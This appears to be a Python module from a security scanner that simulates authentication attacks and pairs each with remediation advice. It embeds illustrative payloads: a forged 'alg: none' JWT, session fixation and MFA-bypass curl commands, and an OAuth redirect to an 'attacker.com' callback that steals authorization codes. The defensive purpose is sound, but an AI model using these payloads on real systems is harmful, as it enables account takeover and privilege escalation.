"""
Runtime Authentication Attack Simulator
Simulates auth attacks to verify vulnerabilities
Enhanced with real runtime testing capabilities
"""

from typing import List, Dict, Optional
from pydantic import BaseModel, Field
from enum import Enum
import logging
from .jwt_tester import JWTSecurityTester, JWTTestResult
from .oauth_tester import OAuth2SecurityTester, OAuthTestResult
from .session_tester import SessionSecurityTester, SessionTestResult

logger = logging.getLogger(__name__)


class AuthAttackType(str, Enum):
    """Types of auth attacks"""
    JWT_ALGORITHM_CONFUSION = "jwt_algorithm_confusion"
    TOKEN_SWAPPING = "token_swapping"
    SESSION_FIXATION = "session_fixation"
    MFA_BYPASS = "mfa_bypass"
    OAUTH_REDIRECT = "oauth_redirect"
    CREDENTIAL_STUFFING = "credential_stuffing"
    BRUTE_FORCE = "brute_force"


class AuthAttackResult(BaseModel):
    """Result of an auth attack simulation"""
    attack_type: AuthAttackType
    target_endpoint: str
    attack_payload: str
    expected_outcome: str
    impact: str
    severity: str
    confidence: float
    remediation: str


class AuthAttackSimulator:
    """
    Simulates authentication attacks
    Enhanced with:
    - JWT runtime testing
    - OAuth 2.0 security testing
    - Session management testing
    """

    def __init__(self, enable_runtime_testing: bool = True):
        self.results: List[AuthAttackResult] = []
        self.enable_runtime_testing = enable_runtime_testing

        # Runtime testing results
        self.jwt_results: List[JWTTestResult] = []
        self.oauth_results: List[OAuthTestResult] = []
        self.session_results: List[SessionTestResult] = []

        if enable_runtime_testing:
            logger.info("Runtime testing enabled for Auth Scanner")

    async def generate_attack_scenarios(
        self,
        vulnerabilities: List
    ) -> List[AuthAttackResult]:
        """
        Generate attack scenarios for auth vulnerabilities

        Args:
            vulnerabilities: List of detected auth vulnerabilities

        Returns:
            List of attack simulation results
        """
        logger.info("Generating auth attack scenarios")

        self.results = []

        # JWT algorithm confusion
        await self._simulate_jwt_algorithm_confusion()

        # Token swapping
        await self._simulate_token_swapping()

        # Session fixation
        await self._simulate_session_fixation()

        # MFA bypass
        await self._simulate_mfa_bypass()

        # OAuth redirect
        await self._simulate_oauth_redirect()

        logger.info(f"Generated {len(self.results)} auth attack scenarios")
        return self.results

    async def _simulate_jwt_algorithm_confusion(self):
        """Simulate JWT algorithm confusion attack"""
        attack_payload = """
# JWT Algorithm Confusion Attack

# Step 1: Obtain a valid JWT token
valid_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMTIzIiwicm9sZSI6InVzZXIifQ.signature"

# Step 2: Decode and modify header to use 'none' algorithm
import base64
import json

header = {"alg": "none", "typ": "JWT"}
payload = {"user_id": "123", "role": "admin"}  # Escalate to admin

# Step 3: Create forged token
header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

forged_token = f"{header_b64}.{payload_b64}."  # No signature with 'none' algorithm

# Step 4: Use forged token
curl -H "Authorization: Bearer {forged_token}" http://api.example.com/admin
"""

        self.results.append(AuthAttackResult(
            attack_type=AuthAttackType.JWT_ALGORITHM_CONFUSION,
            target_endpoint="/admin",
            attack_payload=attack_payload,
            expected_outcome="Gain admin access with forged token",
            impact="Complete authentication bypass and privilege escalation",
            severity="critical",
            confidence=0.9,
            remediation=(
                "1. Explicitly specify allowed algorithms in JWT verification\n"
                "2. Never allow algorithm='none'\n"
                "3. Use strong algorithms (RS256 for asymmetric, HS256 for symmetric)\n"
                "4. Validate algorithm before verification"
            )
        ))

    async def _simulate_token_swapping(self):
        """Simulate token swapping attack"""
        attack_payload = """
# Token Swapping Attack

# Scenario: API accepts tokens from multiple sources

# Step 1: Obtain low-privilege token
user_token = get_token(username="user", password="pass")

# Step 2: Obtain token from different context (e.g., mobile app)
mobile_token = get_mobile_app_token()

# Step 3: Swap tokens between contexts
# Use mobile token in web context or vice versa
curl -H "Authorization: Bearer {mobile_token}" http://web-api.example.com/admin

# Step 4: If tokens aren't context-specific, may gain unintended access
"""

        self.results.append(AuthAttackResult(
            attack_type=AuthAttackType.TOKEN_SWAPPING,
            target_endpoint="/admin",
            attack_payload=attack_payload,
            expected_outcome="Access resources with wrong context token",
            impact="Authorization bypass through token context confusion",
            severity="high",
            confidence=0.6,
            remediation=(
                "1. Include context in token claims (web/mobile/api)\n"
                "2. Validate token context matches request context\n"
                "3. Use different signing keys for different contexts\n"
                "4. Include audience (aud) claim in JWT"
            )
        ))

    async def _simulate_session_fixation(self):
        """Simulate session fixation attack"""
        attack_payload = """
# Session Fixation Attack

# Step 1: Attacker obtains a session ID
curl http://example.com/login  # Returns Set-Cookie: session_id=abc123

# Step 2: Attacker tricks victim to use this session
# Send victim link: http://example.com/login?session_id=abc123

# Step 3: Victim logs in with the fixed session ID
# Application doesn't regenerate session on authentication

# Step 4: Attacker uses the same session ID
curl -b "session_id=abc123" http://example.com/account
# Now authenticated as victim
"""

        self.results.append(AuthAttackResult(
            attack_type=AuthAttackType.SESSION_FIXATION,
            target_endpoint="/login",
            attack_payload=attack_payload,
            expected_outcome="Hijack user session by fixing session ID before login",
            impact="Session hijacking and account takeover",
            severity="high",
            confidence=0.7,
            remediation=(
                "1. Regenerate session ID after successful login\n"
                "2. Don't accept session IDs from URL parameters\n"
                "3. Invalidate old session on login\n"
                "4. Use secure session management libraries"
            )
        ))

    async def _simulate_mfa_bypass(self):
        """Simulate MFA bypass attack"""
        attack_payload = """
# MFA Bypass Attack

# Method 1: Direct endpoint access
# Step 1: Login with valid credentials
curl -X POST http://example.com/login \\
  -d '{"username": "victim", "password": "stolen_pass"}'
# Returns: {"status": "mfa_required", "temp_token": "xyz"}

# Step 2: Skip MFA verification and directly access authenticated endpoints
curl -H "Authorization: Bearer xyz" http://example.com/dashboard
# If temp token grants partial access, MFA is bypassed

# Method 2: Race condition in MFA
# Send multiple simultaneous requests during MFA window

# Method 3: Backup code abuse
# Try common backup codes: 000000, 123456, etc.
"""

        self.results.append(AuthAttackResult(
            attack_type=AuthAttackType.MFA_BYPASS,
            target_endpoint="/login",
            attack_payload=attack_payload,
            expected_outcome="Access account without completing MFA",
            impact="Bypass second factor authentication",
            severity="critical",
            confidence=0.6,
            remediation=(
                "1. Don't grant any access until MFA completes\n"
                "2. Use separate tokens for pre-MFA and post-MFA states\n"
                "3. Rate limit MFA attempts\n"
                "4. Monitor for MFA bypass attempts\n"
                "5. Use secure backup codes (long, random)"
            )
        ))

    async def _simulate_oauth_redirect(self):
        """Simulate OAuth redirect attack"""
        attack_payload = """
# OAuth Redirect URI Attack

# Step 1: Attacker crafts malicious OAuth request
malicious_url = "https://oauth.example.com/authorize?" \\
    "client_id=legit_client" \\
    "&redirect_uri=https://attacker.com/callback" \\  # Attacker's domain
    "&response_type=code" \\
    "&scope=read_profile"

# Step 2: Trick victim to click the link
# Victim approves the request

# Step 3: Authorization code sent to attacker's redirect URI
# Attacker receives: https://attacker.com/callback?code=AUTH_CODE

# Step 4: Attacker exchanges code for access token
curl -X POST https://oauth.example.com/token \\
  -d "code=AUTH_CODE" \\
  -d "client_id=legit_client" \\
  -d "client_secret=SECRET"

# Step 5: Attacker accesses victim's resources
"""

        self.results.append(AuthAttackResult(
            attack_type=AuthAttackType.OAUTH_REDIRECT,
            target_endpoint="/oauth/authorize",
            attack_payload=attack_payload,
            expected_outcome="Steal OAuth authorization code via redirect manipulation",
            impact="Account takeover via OAuth flow hijacking",
            severity="critical",
            confidence=0.8,
            remediation=(
                "1. Validate redirect_uri against whitelist\n"
                "2. Require exact match, not substring match\n"
                "3. Use state parameter to prevent CSRF\n"
                "4. Implement PKCE for public clients\n"
                "5. Never allow open redirects"
            )
        ))

    async def test_jwt_security(
        self,
        jwt_endpoint_url: str,
        valid_token: str,
        headers: Optional[Dict[str, str]] = None
    ) -> List[JWTTestResult]:
        """
        Perform runtime JWT security testing

        Args:
            jwt_endpoint_url: Protected endpoint that accepts JWT
            valid_token: A valid JWT token for baseline testing
            headers: Optional additional headers

        Returns:
            List of JWT test results
        """
        if not self.enable_runtime_testing:
            logger.info("Runtime testing disabled, skipping JWT tests")
            return []

        logger.info(f"Running JWT security tests on {jwt_endpoint_url}")

        async with JWTSecurityTester() as jwt_tester:
            self.jwt_results = await jwt_tester.test_jwt_endpoint(
                jwt_endpoint_url,
                valid_token,
                headers
            )

        logger.info(
            f"JWT testing completed: {len(self.jwt_results)} tests, "
            f"{sum(1 for r in self.jwt_results if r.is_vulnerable)} vulnerabilities"
        )

        return self.jwt_results

    async def test_oauth_security(
        self,
        authorization_url: str,
        client_id: str,
        redirect_uri: str,
        token_url: Optional[str] = None
    ) -> List[OAuthTestResult]:
        """
        Perform runtime OAuth 2.0 security testing

        Args:
            authorization_url: OAuth authorization endpoint
            client_id: OAuth client ID
            redirect_uri: Valid redirect URI
            token_url: Optional token endpoint

        Returns:
            List of OAuth test results
        """
        if not self.enable_runtime_testing:
            logger.info("Runtime testing disabled, skipping OAuth tests")
            return []

        logger.info(f"Running OAuth 2.0 security tests on {authorization_url}")

        async with OAuth2SecurityTester() as oauth_tester:
            self.oauth_results = await oauth_tester.test_oauth_endpoint(
                authorization_url,
                client_id,
                redirect_uri,
                token_url
            )

        logger.info(
            f"OAuth testing completed: {len(self.oauth_results)} tests, "
            f"{sum(1 for r in self.oauth_results if r.is_vulnerable)} vulnerabilities"
        )

        return self.oauth_results

    async def test_session_security(
        self,
        login_url: str,
        credentials: Dict[str, str],
        protected_url: str,
        logout_url: Optional[str] = None
    ) -> List[SessionTestResult]:
        """
        Perform runtime session management security testing

        Args:
            login_url: Login endpoint
            credentials: Test credentials
            protected_url: Protected endpoint to verify access
            logout_url: Optional logout endpoint

        Returns:
            List of session test results
        """
        if not self.enable_runtime_testing:
            logger.info("Runtime testing disabled, skipping session tests")
            return []

        logger.info(f"Running session security tests on {login_url}")

        async with SessionSecurityTester() as session_tester:
            self.session_results = await session_tester.test_session_security(
                login_url,
                credentials,
                protected_url,
                logout_url
            )

        logger.info(
            f"Session testing completed: {len(self.session_results)} tests, "
            f"{sum(1 for r in self.session_results if r.is_vulnerable)} vulnerabilities"
        )

        return self.session_results

    def get_runtime_test_summary(self) -> Dict:
        """Get summary of all runtime tests"""

        total_tests = (
            len(self.jwt_results) +
            len(self.oauth_results) +
            len(self.session_results)
        )

        total_vulnerabilities = (
            sum(1 for r in self.jwt_results if r.is_vulnerable) +
            sum(1 for r in self.oauth_results if r.is_vulnerable) +
            sum(1 for r in self.session_results if r.is_vulnerable)
        )

        return {
            "total_tests": total_tests,
            "total_vulnerabilities": total_vulnerabilities,
            "jwt": {
                "tests": len(self.jwt_results),
                "vulnerabilities": sum(1 for r in self.jwt_results if r.is_vulnerable)
            },
            "oauth": {
                "tests": len(self.oauth_results),
                "vulnerabilities": sum(1 for r in self.oauth_results if r.is_vulnerable)
            },
            "session": {
                "tests": len(self.session_results),
                "vulnerabilities": sum(1 for r in self.session_results if r.is_vulnerable)
            }
        }

    def generate_auth_test_suite(self) -> str:
        """Generate automated auth test suite"""
        test_suite = "# Auto-generated Authentication Security Tests\n\n"
        test_suite += "import pytest\nimport requests\n\n"

        for i, result in enumerate(self.results):
            test_name = f"test_auth_{result.attack_type.value}_{i}"

            test_suite += f"def {test_name}():\n"
            test_suite += f"    \"\"\"\n"
            test_suite += f"    Test for: {result.attack_type.value}\n"
            test_suite += f"    Expected: System should prevent this attack\n"
            test_suite += f"    \"\"\"\n"
            test_suite += f"    # Attack scenario: {result.expected_outcome}\n"
            test_suite += f"    # {result.attack_payload[:100]}...\n"
            test_suite += f"    # TODO: Implement actual test\n"
            test_suite += f"    assert False, 'Auth vulnerability: {result.attack_type.value}'\n\n"

        return test_suite
